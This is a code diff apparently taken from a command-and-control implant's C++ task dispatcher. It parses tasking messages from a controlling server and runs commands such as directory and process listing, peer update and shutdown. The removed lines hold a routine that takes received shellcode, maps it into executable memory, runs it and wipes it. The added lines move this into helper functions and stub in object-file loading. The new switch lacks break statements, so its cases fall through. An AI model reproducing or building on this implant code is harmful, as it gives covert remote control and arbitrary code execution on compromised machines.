@@ -1,15 +1,6 @@
 #include <core/include/dispatch.hpp>
 namespace Dispatcher {
 
-    _code_seg(".rdata") _command_map cmd_map[] = {
-        {.Id = CommandDir,          .Function = Commands::DirectoryList},
-        {.Id = CommandMods,         .Function = Commands::ProcessModules},
-        {.Id = CommandProcess,      .Function = Commands::ProcessList},
-        {.Id = CommandUpdatePeer,   .Function = Commands::UpdatePeer},
-        {.Id = CommandShutdown,     .Function = Commands::Shutdown},
-        {.Id = 0,                   .Function = nullptr}
-    };
-
     BOOL PeekPID(const _stream *const stream) {
         HEXANE
 
@@ -246,70 +237,33 @@ namespace Dispatcher {
         HEXANE
 
         _parser parser = { };
-        ULONG msg_type = 0;
 
         Parser::CreateParser(&parser, B_PTR(in->Buffer), in->Length);
         Parser::UnpackDword(&parser);
 
         Ctx->Session.CurrentTaskId  = Parser::UnpackDword(&parser);
-        msg_type = Parser::UnpackDword(&parser);
 
+        auto msg_type = Parser::UnpackDword(&parser);
         switch (msg_type) {
 
             case TypeCheckin: {
                 Ctx->Session.Checkin = TRUE;
                 break;
             }
-
             case TypeTasking: {
-
-                auto cmd_id = Parser::UnpackDword(&parser);
-                if (cmd_id == CommandNoJob) {
-                    break;
-                }
-
-                for (uint32_t i = 0 ;; i++) {
-                    if (!cmd_map[i].Function) {
-                        return_defer(ERROR_PROC_NOT_FOUND);
-                    }
-
-                    if (cmd_map[i].Id == cmd_id) {
-                        const auto cmd = R_CAST(void(*)(_parser*), Ctx->Base.Address + U_PTR(cmd_map[i].Function));
-                        cmd(&parser);
-                        break;
-                    }
-                }
+                Memory::Execute::ExecuteCommand(parser);
             }
-
             case TypeExecute: {
-
-                void *exec  = { };
-                size_t size = parser.Length;
-
-                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
-                    return_defer(ntstatus);
-                }
-
-                x_memcpy(exec, parser.Buffer, parser.Length);
-                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &exec, &size, PAGE_EXECUTE_READ, nullptr))) {
-                    return_defer(ntstatus);
-                }
-
-                auto (*cmd)(_parser*) = R_CAST(void(*)(_parser*), exec);
-                cmd(&parser);
-
-                x_memset(exec, 0, size);
-
-                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &exec, &size, MEM_FREE))) {
-                    return_defer(ntstatus);
-                }
+                Memory::Execute::ExecuteShellcode(parser);
+            }
+            case TypeObject: {
+                // load a BOF file
             }
 
             default:
                 break;
         }
 
-        defer:
         Parser::DestroyParser(&parser);
     }
 }
